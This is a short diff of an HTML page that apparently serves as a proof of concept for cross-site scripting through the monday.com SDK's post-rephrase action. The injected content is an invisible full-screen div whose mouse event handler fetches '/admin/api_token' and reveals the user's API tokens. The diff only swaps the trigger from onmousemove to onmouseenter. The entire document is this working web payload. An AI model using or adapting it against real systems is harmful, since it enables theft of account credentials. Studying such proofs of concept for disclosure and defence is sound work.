@@ -5,7 +5,7 @@
 <body>
   <script>
     const monday = window.mondaySdk();
-    monday.execute("updatePostContentAction", { suggestedRephrase: "<div onmousemove=\"fetch('/admin/api_token').then(response=>response.json()).then(data=>alert('api_token:'+data.api_token+'personal_api_token:'+data.personal_api_token+'api_v2_token:'+data.api_v2_token))\" style=\"position:fixed;top:0;left:0;height:100%;width:100%;opacity:0;z-index:99999999999;\"></div>"});
+    monday.execute("updatePostContentAction", { suggestedRephrase: "<div onmouseenter=\"fetch('/admin/api_token').then(response=>response.json()).then(data=>alert('api_token:'+data.api_token+'personal_api_token:'+data.personal_api_token+'api_v2_token:'+data.api_v2_token))\" style=\"position:fixed;top:0;left:0;height:100%;width:100%;opacity:0;z-index:99999999999;\"></div>"});
   </script>
   Hello
 </body>
